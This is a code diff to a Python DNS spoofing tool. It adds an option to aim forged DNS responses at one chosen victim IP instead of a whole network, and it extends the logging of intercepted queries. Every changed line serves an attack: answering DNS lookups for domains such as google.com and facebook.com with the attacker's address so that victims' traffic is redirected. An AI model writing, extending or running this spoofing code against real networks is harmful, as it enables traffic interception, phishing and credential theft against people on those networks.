@@ -37,7 +37,8 @@ class DNSSpoofer:
         self,
         attacker_ip: str,
         target_domains: Optional[List[str]] = None,
-        interface: Optional[str] = None
+        interface: Optional[str] = None,
+        victim_ip: Optional[str] = None
     ):
         """
         Initialize DNS Spoofer
@@ -46,10 +47,12 @@ class DNSSpoofer:
             attacker_ip: IP address to redirect victims to (attacker's IP)
             target_domains: List of domains to spoof (e.g., ["google.com", "facebook.com"])
             interface: Network interface to sniff on (e.g., "eth0", "WiFi")
+            victim_ip: (Optional) Specific victim IP to target. If None, affects all devices.
         """
         self.attacker_ip = attacker_ip or get_local_ip()
         self.target_domains = set(target_domains or ["google.com", "facebook.com"])
         self.interface = interface
+        self.victim_ip = victim_ip  # NEW: Can be None for network-wide or specific IP for targeted
         
         self.logger = get_logger("DNSSpoof")
         self.is_running = False
@@ -57,9 +60,10 @@ class DNSSpoofer:
         self.packets_spoofed = 0
         self.start_time = None
         
+        target_str = f"victim={self.victim_ip}" if victim_ip else "network-wide"
         self.logger.info(
             f"Initialized DNSSpoofer: attacker_ip={self.attacker_ip}, "
-            f"domains={self.target_domains}, interface={interface}"
+            f"domains={self.target_domains}, interface={interface}, {target_str}"
         )
     
     def _is_target_domain(self, query_name: str) -> bool:
@@ -128,6 +132,14 @@ class DNSSpoofer:
             if not packet.haslayer(DNS):
                 return
             
+            # If victim_ip is specified, only respond to queries from that victim
+            if self.victim_ip:
+                if not packet.haslayer(IP):
+                    return
+                source_ip = packet[IP].src
+                if source_ip != self.victim_ip:
+                    return  # Ignore queries from other IPs
+            
             dns_layer = packet[DNS]
             
             # Only process queries (not responses)
@@ -138,7 +150,8 @@ class DNSSpoofer:
                     
                     # Check if it's one of our target domains
                     if self._is_target_domain(query_name):
-                        self.logger.info(f"🎯 Intercepted DNS query for {query_name}")
+                        victim_info = f"from {self.victim_ip}" if self.victim_ip else "from network"
+                        self.logger.info(f"🎯 Intercepted DNS query {victim_info} for {query_name}")
                         
                         # Create and send fake response
                         fake_response = self._create_fake_dns_response(packet, query_name)
